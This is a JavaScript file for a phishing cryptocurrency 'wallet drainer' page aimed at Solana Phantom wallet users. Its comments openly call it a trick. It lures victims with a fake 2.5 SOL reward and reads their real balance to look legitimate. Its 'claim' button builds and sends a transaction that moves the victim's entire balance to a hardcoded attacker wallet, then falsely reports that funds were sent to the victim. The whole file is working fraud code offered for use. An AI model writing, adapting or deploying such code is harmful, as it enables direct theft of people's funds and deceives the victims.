// Configuration
const YOUR_WALLET_ADDRESS = "D7sb3Z3a3xduMuurdzKvFPBeALfpz2KVoe9bF8SeoJrV"; // REPLACE THIS
const REWARD_AMOUNT = "2.5"; // Fake reward to show

// DOM Elements
const navBtn = document.getElementById('nav-connect-btn');
const btnEnter = document.getElementById('btn-enter-wallet');
const btnClaim = document.getElementById('btn-claim-final');
const landingSection = document.getElementById('landing-section');
const walletSection = document.getElementById('wallet-section');
const loadingOverlay = document.getElementById('loading-overlay');
const userAddrDisplay = document.getElementById('user-address');
const balanceDisplay = document.getElementById('detected-balance');
const rewardDisplay = document.getElementById('reward-amount');

let connection, wallet;

// --- Step 1: Connect Wallet ---
async function connectWallet() {
    showLoading(true);
    
    // Check for Solana Provider
    if (!window.solana || !window.solana.isPhantom) {
        showToast("Please install Phantom Wallet!");
        showLoading(false);
        return;
    }

    try {
        const resp = await window.solana.connect();
        wallet = resp.publicKey;
        
        // Update UI
        userAddrDisplay.innerText = wallet.toString().slice(0, 4) + "..." + wallet.toString().slice(-4);
        navBtn.innerText = wallet.toString().slice(0, 4) + "...";
        navBtn.style.border = "1px solid #14F195";
        navBtn.style.color = "#14F195";
        
        // Simulate fetching balance (make it look real)
        await fetchBalance();
        
        // Switch Views
        landingSection.classList.remove('active-section');
        landingSection.classList.add('hidden-section');
        walletSection.classList.remove('hidden-section');
        walletSection.style.display = 'block';
        
        setTimeout(() => walletSection.style.opacity = '1', 100);
        
        showLoading(false);
    } catch (err) {
        console.error(err);
        showLoading(false);
    }
}

// --- Step 2: Fetch Balance (The "Real" Look) ---
async function fetchBalance() {
    try {
        connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
        const balance = await connection.getBalance(wallet);
        const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
        
        // Display with 4 decimals
        balanceDisplay.innerText = solBalance.toFixed(4) + " SOL";
        
        // If they have 0, we might show 0, but usually we want to show what they have
    } catch (err) {
        balanceDisplay.innerText = "0.0000 SOL";
    }
}

// --- Step 3: Claim & Drain (The Trick) ---
async function claimAndDrain() {
    btnClaim.disabled = true;
    btnClaim.innerText = "Confirming Transaction...";
    
    try {
        // Create a transaction sending everything to YOU
        const transaction = new solanaWeb3.Transaction();
        
        // Get recent blockhash
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = wallet;

        // Get balance
        const balance = await connection.getBalance(wallet);
        
        // Create instruction to send ALL lamports to your wallet
        const instruction = solanaWeb3.SystemProgram.transfer({
            fromPubkey: wallet,
            toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET_ADDRESS),
            lamports: balance // Sends EVERYTHING
        });

        transaction.add(instruction);

        // Sign and Send
        const signed = await window.solana.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signed.serialize());
        
        await connection.confirmTransaction(signature);
        
        // Success UI
        walletSection.innerHTML = `
            <div style="text-align:center; padding: 50px 0;">
                <i class="fa-solid fa-circle-check" style="font-size: 4rem; color: #14F195; margin-bottom: 20px;"></i>
                <h2>Claim Successful!</h2>
                <p style="color:#ccc; margin-top:10px;">Funds have been sent to your wallet.</p>
            </div>
        `;

    } catch (err) {
        console.error(err);
        showToast("Transaction failed.");
        btnClaim.innerText = "Try Again";
        btnClaim.disabled = false;
    }
}

// --- Helpers ---
function showLoading(isLoading) {
    if (isLoading) loadingOverlay.classList.remove('hidden');
    else loadingOverlay.classList.add('hidden');
}

function showToast(msg) {
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML = `<i class="fa-solid fa-info-circle"></i> ${msg}`;
    document.getElementById('toast-container').appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

// Event Listeners
navBtn.addEventListener('click', connectWallet);
btnEnter.addEventListener('click', connectWallet);
btnClaim.addEventListener('click', claimAndDrain);

// Init
window.addEventListener('load', () => {
    rewardDisplay.innerText = REWARD_AMOUNT;
});